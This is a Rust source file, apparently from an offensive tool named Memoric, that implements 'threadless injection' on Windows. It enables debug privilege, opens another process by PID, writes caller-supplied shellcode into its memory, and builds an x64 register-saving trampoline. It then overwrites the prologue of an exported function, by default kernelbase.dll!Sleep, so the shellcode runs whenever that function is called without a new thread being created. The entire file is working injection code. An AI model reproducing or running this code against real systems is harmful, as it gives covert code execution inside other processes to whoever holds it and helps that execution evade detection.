//! Threadless Injection - hook an exported function to redirect execution without creating threads

use crate::error::MemoricError;
use crate::safe_handle::SafeHandle;
use serde_json::Value;

/// Threadless injection — hook exported function in remote process
pub fn threadless_inject(args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::System::Diagnostics::Debug::{ReadProcessMemory, WriteProcessMemory};
    use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
    use windows::Win32::System::Memory::{
        VirtualAllocEx, VirtualProtectEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ,
        PAGE_READWRITE,
    };
    use windows::Win32::System::ProcessStatus::{
        EnumProcessModulesEx, GetModuleBaseNameA, LIST_MODULES_ALL,
    };
    use windows::Win32::System::Threading::{
        OpenProcess, PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION, PROCESS_VM_READ,
        PROCESS_VM_WRITE,
    };

    let pid = args
        .get("pid")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| MemoricError::InjectionFailed("Missing pid".to_string()))?;
    let shellcode = args
        .get("shellcode")
        .and_then(|v| v.as_array())
        .ok_or_else(|| MemoricError::InjectionFailed("Missing shellcode".to_string()))?;
    let target_function = args
        .get("target_function")
        .and_then(|v| v.as_str())
        .unwrap_or("Sleep");
    let target_module = args
        .get("target_module")
        .and_then(|v| v.as_str())
        .unwrap_or("kernelbase.dll");

    let shellcode_bytes: Vec<u8> = shellcode
        .iter()
        .filter_map(|v| v.as_u64().map(|b| b as u8))
        .collect();
    if shellcode_bytes.is_empty() {
        return Err(MemoricError::InjectionFailed("Empty shellcode".to_string()));
    }

    tracing::warn!(
        "[INJECT] Threadless injection: PID {} hooking {}!{}",
        pid,
        target_module,
        target_function
    );

    let _ = crate::privilege::debug::enable_debug_privilege(&serde_json::json!({}));

    unsafe {
        // Open target process first (need handle for remote module enumeration)
        let handle = OpenProcess(
            PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,
            false,
            pid as u32,
        )
        .map_err(|e| MemoricError::WindowsApi(format!("OpenProcess: {}", e)))?;
        let handle = SafeHandle::new(handle);

        // Resolve function offset locally, then find remote module base (ASLR-safe)
        let mut mod_name = target_module.as_bytes().to_vec();
        mod_name.push(0);
        let local_hmod =
            GetModuleHandleA(windows::core::PCSTR(mod_name.as_ptr())).map_err(|e| {
                MemoricError::InjectionFailed(format!("GetModuleHandle({}): {}", target_module, e))
            })?;

        let mut func_name = target_function.as_bytes().to_vec();
        func_name.push(0);
        let local_func_addr = GetProcAddress(local_hmod, windows::core::PCSTR(func_name.as_ptr()))
            .ok_or_else(|| {
                MemoricError::InjectionFailed(format!(
                    "{}!{} not found locally",
                    target_module, target_function
                ))
            })?;
        let func_offset = local_func_addr as usize - local_hmod.0 as usize;

        // Enumerate modules in remote process to find the real base address
        let mut modules = vec![windows::Win32::Foundation::HMODULE::default(); 1024];
        let mut needed = 0u32;
        EnumProcessModulesEx(
            *handle,
            modules.as_mut_ptr(),
            (modules.len() * std::mem::size_of::<windows::Win32::Foundation::HMODULE>()) as u32,
            &mut needed,
            LIST_MODULES_ALL,
        )
        .map_err(|e| MemoricError::InjectionFailed(format!("EnumProcessModulesEx: {}", e)))?;

        let module_count =
            needed as usize / std::mem::size_of::<windows::Win32::Foundation::HMODULE>();
        let target_lower = target_module.to_lowercase();
        let mut remote_base: Option<usize> = None;

        for i in 0..module_count {
            let mut name_buf = [0u8; 260];
            let len = GetModuleBaseNameA(*handle, modules[i], &mut name_buf);
            if len > 0 {
                let name = std::str::from_utf8(&name_buf[..len as usize]).unwrap_or("");
                if name.to_lowercase() == target_lower {
                    remote_base = Some(modules[i].0 as usize);
                    break;
                }
            }
        }

        let remote_base = remote_base.ok_or_else(|| {
            MemoricError::InjectionFailed(format!(
                "{} not found in PID {} module list",
                target_module, pid
            ))
        })?;
        let func_addr = remote_base + func_offset;

        // 1. Allocate shellcode cave in remote process
        let shellcode_cave = VirtualAllocEx(
            *handle,
            None,
            shellcode_bytes.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );
        if shellcode_cave.is_null() {
            return Err(MemoricError::InjectionFailed(
                "VirtualAllocEx shellcode cave failed".to_string(),
            ));
        }

        // Write shellcode
        WriteProcessMemory(
            *handle,
            shellcode_cave,
            shellcode_bytes.as_ptr() as *const _,
            shellcode_bytes.len(),
            None,
        )
        .map_err(|e| {
            MemoricError::InjectionFailed(format!("WriteProcessMemory shellcode: {}", e))
        })?;

        // Mark shellcode as RX
        let mut old = windows::Win32::System::Memory::PAGE_PROTECTION_FLAGS(0);
        VirtualProtectEx(
            *handle,
            shellcode_cave,
            shellcode_bytes.len(),
            PAGE_EXECUTE_READ,
            &mut old,
        )
        .map_err(|e| MemoricError::InjectionFailed(format!("VirtualProtectEx shellcode: {}", e)))?;

        // 2. Build trampoline stub:
        //    save all registers → call shellcode_cave → restore registers → execute original bytes → jmp back
        let backup_size: usize = 16; // backup first 16 bytes of target function

        // Read original bytes
        let mut original_bytes = vec![0u8; backup_size];
        let mut bytes_read = 0usize;
        ReadProcessMemory(
            *handle,
            func_addr as *const _,
            original_bytes.as_mut_ptr() as *mut _,
            backup_size,
            Some(&mut bytes_read),
        )
        .map_err(|e| MemoricError::InjectionFailed(format!("ReadProcessMemory original: {}", e)))?;

        // Build trampoline
        let mut trampoline = Vec::with_capacity(128);
        // Save registers
        trampoline.extend_from_slice(&[0x50]); // push rax
        trampoline.extend_from_slice(&[0x51]); // push rcx
        trampoline.extend_from_slice(&[0x52]); // push rdx
        trampoline.extend_from_slice(&[0x53]); // push rbx
        trampoline.extend_from_slice(&[0x41, 0x50]); // push r8
        trampoline.extend_from_slice(&[0x41, 0x51]); // push r9
        trampoline.extend_from_slice(&[0x41, 0x52]); // push r10
        trampoline.extend_from_slice(&[0x41, 0x53]); // push r11
                                                     // sub rsp, 0x28 (shadow space for Windows x64 ABI)
        trampoline.extend_from_slice(&[0x48, 0x83, 0xEC, 0x28]);
        // mov rax, shellcode_cave_addr; call rax
        trampoline.extend_from_slice(&[0x48, 0xB8]);
        trampoline.extend_from_slice(&(shellcode_cave as u64).to_le_bytes());
        trampoline.extend_from_slice(&[0xFF, 0xD0]); // call rax
                                                     // add rsp, 0x28
        trampoline.extend_from_slice(&[0x48, 0x83, 0xC4, 0x28]);
        // Restore registers
        trampoline.extend_from_slice(&[0x41, 0x5B]); // pop r11
        trampoline.extend_from_slice(&[0x41, 0x5A]); // pop r10
        trampoline.extend_from_slice(&[0x41, 0x59]); // pop r9
        trampoline.extend_from_slice(&[0x41, 0x58]); // pop r8
        trampoline.extend_from_slice(&[0x5B]); // pop rbx
        trampoline.extend_from_slice(&[0x5A]); // pop rdx
        trampoline.extend_from_slice(&[0x59]); // pop rcx
        trampoline.extend_from_slice(&[0x58]); // pop rax
                                               // Execute original bytes
        trampoline.extend_from_slice(&original_bytes);
        // jmp back to (func_addr + backup_size)
        trampoline.extend_from_slice(&[0x48, 0xB8]); // mov rax, return_addr
        trampoline.extend_from_slice(&((func_addr + backup_size) as u64).to_le_bytes());
        trampoline.extend_from_slice(&[0xFF, 0xE0]); // jmp rax

        // 3. Allocate trampoline cave
        let trampoline_cave = VirtualAllocEx(
            *handle,
            None,
            trampoline.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );
        if trampoline_cave.is_null() {
            return Err(MemoricError::InjectionFailed(
                "VirtualAllocEx trampoline failed".to_string(),
            ));
        }

        WriteProcessMemory(
            *handle,
            trampoline_cave,
            trampoline.as_ptr() as *const _,
            trampoline.len(),
            None,
        )
        .map_err(|e| {
            MemoricError::InjectionFailed(format!("WriteProcessMemory trampoline: {}", e))
        })?;

        VirtualProtectEx(
            *handle,
            trampoline_cave,
            trampoline.len(),
            PAGE_EXECUTE_READ,
            &mut old,
        )
        .map_err(|e| {
            MemoricError::InjectionFailed(format!("VirtualProtectEx trampoline: {}", e))
        })?;

        // 4. Patch target function prologue with jmp to trampoline
        let mut hook = Vec::with_capacity(backup_size);
        // mov rax, trampoline_cave_addr; jmp rax (12 bytes)
        hook.extend_from_slice(&[0x48, 0xB8]);
        hook.extend_from_slice(&(trampoline_cave as u64).to_le_bytes());
        hook.extend_from_slice(&[0xFF, 0xE0]);
        // NOP-pad remainder
        while hook.len() < backup_size {
            hook.push(0x90);
        }

        VirtualProtectEx(
            *handle,
            func_addr as *mut _,
            backup_size,
            PAGE_READWRITE,
            &mut old,
        )
        .map_err(|e| MemoricError::InjectionFailed(format!("VirtualProtectEx hook: {}", e)))?;

        WriteProcessMemory(
            *handle,
            func_addr as *mut _,
            hook.as_ptr() as *const _,
            hook.len(),
            None,
        )
        .map_err(|e| MemoricError::InjectionFailed(format!("WriteProcessMemory hook: {}", e)))?;

        VirtualProtectEx(*handle, func_addr as *mut _, backup_size, old, &mut old).map_err(
            |e| MemoricError::InjectionFailed(format!("VirtualProtectEx restore: {}", e)),
        )?;

        Ok(serde_json::json!({
            "success": true,
            "technique": "threadless_injection",
            "pid": pid,
            "target_function": format!("{}!{}", target_module, target_function),
            "function_address": format!("0x{:016X}", func_addr),
            "shellcode_cave": format!("0x{:016X}", shellcode_cave as usize),
            "trampoline_cave": format!("0x{:016X}", trampoline_cave as usize),
            "original_bytes": original_bytes.iter().map(|b| format!("{:02X}", b)).collect::<Vec<_>>().join(" "),
            "message": "Hook installed — shellcode executes when target function is called, then resumes original execution"
        }))
    }
}
